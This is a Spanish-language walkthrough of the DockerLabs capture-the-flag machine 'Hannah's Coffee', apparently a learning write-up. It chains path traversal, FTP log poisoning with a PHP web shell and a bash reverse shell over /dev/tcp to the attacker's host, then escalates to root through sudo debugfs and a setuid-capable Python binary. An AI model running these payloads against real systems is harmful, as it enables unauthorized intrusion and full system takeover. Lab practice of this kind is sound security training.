Hannah's Coffee - DockerLabs 🇪🇸
1. En primer lugar vamos a desempaquetar los archivos, lo llevamos a un lugar seguro e iniciamos el laboratorio.
```bash
unzip hannah_coffee.zip
sudo bash ./auto_deploy.sh hannah-coffee.tar
```

<img width="626" height="512" alt="Captura de pantalla 2026-09-20 232016" src="https://github.com/user-attachments/assets/de030558-6ab3-4936-a18f-548b98a9e511" />
<img width="602" height="428" alt="Captura de pantalla 2026-09-20 232150" src="https://github.com/user-attachments/assets/dae42b9f-9bb2-4dd8-9ae5-fe21dd53bc1f" />
<img width="600" height="481" alt="Captura de pantalla 2026-09-21 001335" src="https://github.com/user-attachments/assets/f811a240-d4ab-4f1d-8231-ce20740c227d" />

2. Después vamos a proceder a escanear los puertos abiertos mediante nmap.
```bash
nmap -sV 172.17.0.2
```
<img width="603" height="254" alt="Captura de pantalla 2026-09-21 001533" src="https://github.com/user-attachments/assets/7728ef51-ca22-4f0b-841f-b32ce9cfb7b3" />

3. Viendo el escenario que tenemos con los puertos tenemos el puerto 21 con ftp abierto y el 80 con http. Buscaremos parámetros ocultos mediante ffuf.
bash
```bash
ffuf -u "http://172.17.0.2/index.php?FUZZ=../../../../etc/passwd" -w /usr/share/dirb/wordlists/common.txt -fs 963
```
<img width="986" height="406" alt="Captura de pantalla 2026-09-20 232656" src="https://github.com/user-attachments/assets/b32d3bee-b32b-47ab-b2f8-b4cefb945e6a" />

4. Ahora encontrando el parámetro oculto que es studio vamos a utilizar curl para que escupa todo el /etc/passwd.
```bash
curl "http://172.17.0.2/index.php?studio=../../../../../../../../../etc/passwd"
```
<img width="601" height="863" alt="Captura de pantalla 2026-09-21 004302" src="https://github.com/user-attachments/assets/771441d1-0b6c-4b8f-bd52-ca21ba777c12" />





4.2 Iremos a http://172.17.0.2/index.php?studio=php://filter/convert.base64-encode/resource=/var/log/vsftpd.log para poder ver la ruta del log y confirmar que es legible.
<img width="1182" height="347" alt="Captura de pantalla 2026-09-21 002005" src="https://github.com/user-attachments/assets/52166bdd-c4bd-449a-b1c4-55b55e4813f8" />
Para poder decodificar esto y que sea legible para los humanos tenemos que decodificarlo, para eso nosotros usaremos una web llamada
CyberChef, pueden usar este link para acceder a ella: https://gchq.github.io
<img width="1183" height="924" alt="Captura de pantalla 2026-09-21 002308" src="https://github.com/user-attachments/assets/1edb36bf-1acb-40b8-8683-133f2acb0c00" />
En ella colocaremos en el Input el código que nos entrego la web, en la sección de Output nos entregara el código en Base64 ya decodificado.

5. Vamos a generar la cadena mediante el exploit de RCE via FTP Log Poisoning. Primero envenenamos el log conectándonos por FTP con el payload PHP.
```bash
ftp 172.17.0.2
```
Usuario:
```bash
<?php system($_GET['cmd']); ?>
```

Contraseña: (cualquiera)

<img width="489" height="181" alt="Captura de pantalla 2026-09-20 233138" src="https://github.com/user-attachments/assets/fa18ce2a-ab5e-40f4-85f0-ab0c7a3528fb" />

6. Ahora aplicaremos la cadena en la URL para ejecutar comandos.
```bash
http://172.17.0.2/index.php?studio=../../../../../../../../../../../../../../../../var/log/vsftpd.log&cmd=whoami
```
<img width="1181" height="444" alt="Captura de pantalla 2026-09-21 002739" src="https://github.com/user-attachments/assets/23e75f42-61af-4e47-94db-dbe80157076b" />

6.2 Ahora continuamos con la reverse shell.
```bash
curl -s "http://172.17.0.2/index.php?studio=../../../../../../../../../../../../../../../../var/log/vsftpd.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4444%200%3E%261%27"
```
<img width="595" height="588" alt="Captura de pantalla 2026-09-21 002850" src="https://github.com/user-attachments/assets/fa6b1cc8-ce59-41a4-b335-d49f2dc77272" />

7. Entramos al sistema mediante escuchar por netcat.
```bash
nc -lvnp 4444
```
<img width="615" height="347" alt="Captura de pantalla 2026-09-20 233505" src="https://github.com/user-attachments/assets/b9815281-d721-459a-948b-ccff5e686bdb" />

8. Para escalar de privilegios haremos sudo -l para poder ver los binarios que podemos modificar.
```bash
sudo -l
```
<img width="603" height="159" alt="image" src="https://github.com/user-attachments/assets/6f0358a6-1cc0-4c02-a2c4-55b48969dba6" />
<img width="585" height="46" alt="image" src="https://github.com/user-attachments/assets/0ba2bfaa-c499-47c3-949d-88b17f8c6685" />
<img width="445" height="55" alt="image" src="https://github.com/user-attachments/assets/bd91e572-6a2f-46e7-a9b0-b00c28d1c770" />

9. Utilizaremos el debugfs.
```bash
sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
```
<img width="612" height="141" alt="image" src="https://github.com/user-attachments/assets/f39e123f-4648-4044-bce8-99cc32d9ac3d" />

10. Obtenemos la bash de hannah con !/bin/bash y utilizaremos el id y los ls -la para ver los procesos que están corriendo en la máquina.
```bash
!/bin/bash
id
```
<img width="464" height="134" alt="image" src="https://github.com/user-attachments/assets/75fd95b1-3c7a-4b47-a07a-dbf6868f0843" />

11. Utilizamos getcap -r / 2>/dev/null para ver que permisos tiene ese binario y /opt/priv-python -c 'import os; os.setuid(0); os.system("/bin/bash")' para explotar la máquina mediante un cambio de UID de hannah a root y poder escalar privilegios.
```bash
/opt/priv-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
<img width="601" height="96" alt="image" src="https://github.com/user-attachments/assets/7a83808d-4bc3-460a-9baf-8864bc4b039a" />

12. Root Key
```bash
cd /root
ls -la
cat root.txt
```
<img width="376" height="132" alt="image" src="https://github.com/user-attachments/assets/67680c5f-1414-45b9-aac9-633da5b52339" />
